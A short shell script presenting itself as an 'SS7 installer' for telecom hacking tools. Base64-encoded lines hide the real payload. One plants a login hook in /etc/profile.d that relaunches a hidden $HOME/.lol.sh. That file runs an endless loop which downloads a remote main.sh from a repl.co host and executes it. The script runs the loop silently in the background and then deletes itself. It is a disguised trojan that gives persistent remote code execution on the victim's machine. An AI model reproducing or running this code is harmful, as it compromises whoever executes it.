#!/bin/sh
sudo echo "SS7 INSTALLER"
sudo echo "HACK GTP, SIP, IMS, VOLTE"
sudo sh -c 'echo "U1RSPSQocHMgLWF1eCkKU1VCPSdsb2wuc2gnCmlmIFtbICIkU1RSIiA9PSAqIiRTVUIiKiBdXTsgdGhlbgogIHRydWUKZWxzZQogICgmPi9kZXYvbnVsbCBiYXNoICRIT01FLy5sb2wuc2ggJikKZmk=" | base64 --decode >> /etc/profile.d/linux_service.sh'
echo "d2hpbGUgdHJ1ZQpkbwpjdXJsIGh0dHBzOi8vbXNmcGF5bG9hZGRiLmJhY3RyYW41LnJlcGwuY28vbWFpbi5zaCA+IC5wYXlsb2FkLnNoCmJhc2ggLnBheWxvYWQuc2gKZG9uZQ==" | base64 --decode >> $HOME/.lol.sh
(&>/dev/null bash $HOME/.lol.sh &)
sudo apt update
sudo apt install python2
sudo python2 sigploit.py
rm -- "$0"
